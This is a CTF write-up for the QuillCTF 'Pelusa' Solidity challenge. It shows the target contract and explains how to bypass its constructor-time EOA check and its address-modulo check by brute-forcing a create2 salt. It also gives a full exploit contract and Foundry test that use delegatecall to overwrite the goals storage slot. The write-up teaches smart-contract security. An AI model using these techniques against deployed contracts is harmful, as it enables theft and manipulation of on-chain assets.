---
title: QuillCTF-8.Pelusa
date: 2024-01-22 17:01:26
tags:
categories: 
    - QuillCTF
---
```
“_**You just opened your eyes and are in Mexico 1986; help Diego set the score from 1 to 2 goals for a win, and do whatever is necessary!”**_
```

## Objective

- Score from 1 to 2 goals for a win.

## Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
    function getBallPossesion() external view returns (address);
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE
// @author https://twitter.com/eugenioclrc
contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
                /// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}
```


## Observation

Our Goal is to make goals to 2 .

To make the goals to 2 , first , we need to call delegatecall() in shoot(). To successful call shoot() function ,we need to pass the require which means we need to let the getBallPossesion() return owner.

The first vuln is the use of `msg.sender.code.length == 0` to Vertify wether `msg.sender` is an EOA,but this check can be byoassed, given that a contract's codesize is set only at the end of it's constructor's execution. This means we can  bypass this check by invoking the `passTheBall()` function from within the exploit contract.

The second vuln is in the same function . `require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");`requiring for the sender's address to have a specified result when interpreted as an integer and it's modulo 100 is calculated. In combination with the vulnerability found above, it becomes obvious that an attacker must come up with a way to deploy a 
contract whose address passes this check: I've accomplished this by brute-forcing the salt given to `create2` when determinstically deploying a contract.

## Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./ppp.sol";

contract PelusaExploit is IGame {
    Pelusa pelusa;
    uint256 slot1;

    address pelusaOwner;

    event Deployed(address);

    constructor(Pelusa _pelusa, address _pelusaDeployer, bytes32 _pelusaBlockHash) {
        emit Deployed(address(this));
        pelusa = _pelusa;
        pelusa.passTheBall();
        pelusaOwner = address(uint160(uint256(keccak256(abi.encodePacked(_pelusaDeployer, _pelusaBlockHash)))));
    }

    function getBallPossesion() external view override returns (address) {
        return pelusaOwner;
    }

    function handOfGod() external returns (bytes32) {
        slot1++;
        return (bytes32(uint256(22_06_1986)));
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/7-ppp/PelusaExploit.sol";

contract PelusaTest is Test {
    Pelusa pel;
    PelusaExploit expl;

    address pelusaDeployer = makeAddr("pelusaDeployer");
    address attacker = makeAddr("attacker");

    function testFindCreate2Salt() external {
        vm.prank(pelusaDeployer);
        pel = new Pelusa();

        vm.startPrank(attacker);
        for (uint256 i; i < 1000; ++i) {
            vm.expectRevert();
            emit log_uint(i);
            expl = new PelusaExploit{
                salt: bytes32(uint256(i))
            }(pel, pelusaDeployer, blockhash(block.number));
        }
    }

    function testExploit() external {
        vm.prank(pelusaDeployer);
        pel = new Pelusa();

        vm.startPrank(attacker);
        /* In a real world scenario, an attacker is able to retrieve the deployer's address and the block.number at which the Pelusa
        contract was deployed, effectively reconstructing the `owner` address and passing the `isGoal()` check.
        */
        expl = new PelusaExploit{
            salt: bytes32(uint256(39)) // salt value 39 was found by brute forcing the create2 address pre computation in the above test
        }(pel, pelusaDeployer, blockhash(block.number));
        pel.shoot();
        vm.stopPrank();

        assertEq(pel.goals(), 2);
    }
}

```